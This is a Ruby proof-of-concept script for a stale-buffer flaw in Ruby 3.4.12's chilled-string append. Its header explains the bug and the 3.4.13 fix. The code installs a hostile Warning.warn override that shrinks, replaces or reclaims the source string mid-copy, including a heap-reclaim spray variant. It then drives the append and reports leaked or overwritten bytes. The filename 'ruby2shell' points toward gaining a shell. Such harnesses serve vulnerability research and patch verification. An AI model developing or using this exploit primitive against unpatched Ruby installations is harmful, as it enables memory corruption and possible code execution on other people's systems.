# Adjacent Ruby 3.4.12 -> 3.4.13 chilled-string append lane (same fix series
# as CVE-2026-132825).  The vulnerable build emits the chilled-string
# deprecation warning *inside* str_buf_cat4, after the caller has already
# passed RSTRING_PTR(str2)/RSTRING_LEN(str2).  A Warning.warn override can
# therefore replace or shrink the right-hand string while its old buffer is
# still the memcpy source.  3.4.13 calls str_modify_keep_cr(str) at the top of
# rb_str_buf_append, before the RHS pointer/length are read.
#
# This is an in-process experiment with a Ruby-level Warning.warn callback.
# No wire input, no debugger write, no marker, no ObjectSpace or maps read.
# Usage:
#   ruby ruby2shell-chilled-append-stale.rb append_str sym replace

Warning[:deprecated] = true
$hook = 0
$rhs = nil
$receiver = nil
$keep = nil

Warning.singleton_class.prepend(Module.new do
  def warn(*msgs, **kw)
    $hook += 1
    case ENV['W329_ACTION']
    when 'shrink'
      $rhs.slice!(1..-1) if $rhs
    when 'replace'
      $rhs.replace("Y" * 4096) if $rhs
    when 'reclaim'
      if $rhs
        $rhs.replace("Y" * 4096)
        $keep = Array.new(Integer(ENV['W329_N'] || '50')) { "Z" * 64 }
      end
    when 'enc'
      $receiver.force_encoding('UTF-16LE') if $receiver
    end
    super
  end
end)

drive = ARGV[0] || 'append_str'
kind  = ARGV[1] || 'sym'
action = ENV['W329_ACTION'] || 'none'

s = case kind
    when 'sym' then :abc.to_s
    when 'lit' then 'abc'
    when 'dup' then 'abc'.dup
    else raise ArgumentError, "unknown receiver kind #{kind.inspect}"
    end
$receiver = s
$rhs = 'X' * 64

begin
  result = case drive
           when 'append_str' then s << $rhs
           when 'append_int' then s << 0x41
           when 'join' then [$rhs, s].join
           else raise ArgumentError, "unknown drive #{drive.inspect}"
           end
  bytes = result.bytes
  tail = bytes.last(8).map { |b| '%02x' % b }.join
  puts "RESULT drive=#{drive} recv=#{kind} action=#{action} hook=#{$hook} " \
       "out=#{bytes.length} rhs=#{$rhs.bytesize} enc=#{result.encoding} " \
       "x=#{bytes.count(88)} y=#{bytes.count(89)} z=#{bytes.count(90)} tail=#{tail}"
rescue => e
  puts "RESULT drive=#{drive} recv=#{kind} action=#{action} hook=#{$hook} " \
       "raised=#{e.class}: #{e.message}"
end
